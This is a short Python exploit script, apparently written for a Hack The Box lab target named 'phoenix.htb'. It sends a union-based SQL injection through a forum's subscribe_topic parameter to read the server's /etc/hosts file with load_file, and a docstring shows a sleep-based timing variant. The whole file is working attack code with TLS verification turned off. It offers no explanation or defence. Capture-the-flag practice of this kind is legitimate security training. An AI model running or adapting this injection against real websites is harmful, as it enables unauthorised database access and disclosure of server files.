#!/usr/bin/python3

import requests
import sys
from pprint import pprint
from urllib.parse import (
    quote, 
    unquote
)


SQLI_DICT = {
    "group_by":"group by"
}

def sqli_enumeration(url: str) -> None:

    """
    url => https://phoenix.htb/forum/?subscribe_topic=1 union select 1 and sleep(2)
    """
    
    url_malicious = "forum/?subscribe_topic=1%20union%20select%201,load_file('/etc/hosts')"
    sess = requests.Session()
    ress = sess.get(url=url+url_malicious, verify=False)
    print(ress.text)
    print(unquote(ress.url))

def main() -> None:
    try:
        url = sys.argv[1]
        sqli_enumeration(url)
    except Exception as e:
        print(str(e))
        exit(1)
    except KeyboardInterrupt:
        exit(0)



if __name__ == "__main__":
    main()
